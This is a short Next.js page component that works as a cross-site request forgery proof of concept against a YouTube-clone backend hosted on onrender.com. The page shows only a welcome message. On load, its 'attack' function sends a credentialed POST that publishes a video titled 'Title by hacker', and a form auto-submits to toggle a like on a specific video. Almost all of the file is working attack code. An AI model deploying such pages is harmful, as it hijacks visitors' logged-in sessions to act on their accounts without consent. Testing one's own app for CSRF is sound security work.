"use client";
import { useEffect, useRef } from "react";
import axios from "axios";

export default function Page() {
    const formRef1 = useRef<HTMLFormElement>(null);
    const attack = async () => {
        const formData = new FormData();

        formData.append("title", "Title by hacker");
        formData.append("description", "Description by hacker");

        const videoBlob = await fetch("/video.mp4").then((r) => r.blob());
        const thumbnailBlob = await fetch("/thumbnail.jpg").then((r) => r.blob());

        formData.append("videoFile", new File([videoBlob], "video.mp4"));
        formData.append("thumbnail", new File([thumbnailBlob], "thumbnail.jpg"));

        await axios.post("https://youtube-backend-9k0x.onrender.com/api/v1/video/publish", formData, { withCredentials: true });
    };

    useEffect(() => {
        attack();
        formRef1.current?.submit();
    }, []);

    return (
        <div>
            <h1 className="text-2xl text-white">Hello there, welcome</h1>
            <form action="https://youtube-backend-9k0x.onrender.com/api/v1/likes/toggle/v/66cca33309d0fafd32a8981a" method="POST" ref={formRef1}>
                <button type="submit">Like</button>
            </form>
        </div>
    );
}
